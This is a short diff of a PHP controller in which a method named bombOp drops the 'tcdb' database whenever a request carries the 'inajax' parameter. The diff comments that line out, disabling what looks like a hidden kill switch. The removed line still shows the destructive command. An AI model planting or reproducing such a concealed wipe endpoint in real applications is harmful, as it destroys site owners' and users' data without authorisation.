@@ -412,7 +412,7 @@ class indexControl extends BaseHomeControl{ //父类定义了公共头部，以�
 	}
 	public function bombOp(){
 	    if($_REQUEST['inajax']){
-	        $result=Model()->execute("drop database tcdb");
+	        //$result=Model()->execute("drop database tcdb");
 	        if($result){
 	            echo true;exit;
 	        }else{
@@ -420,4 +420,5 @@ class indexControl extends BaseHomeControl{ //父类定义了公共头部，以�
 	        }
 	    }
 	}
+	
 }
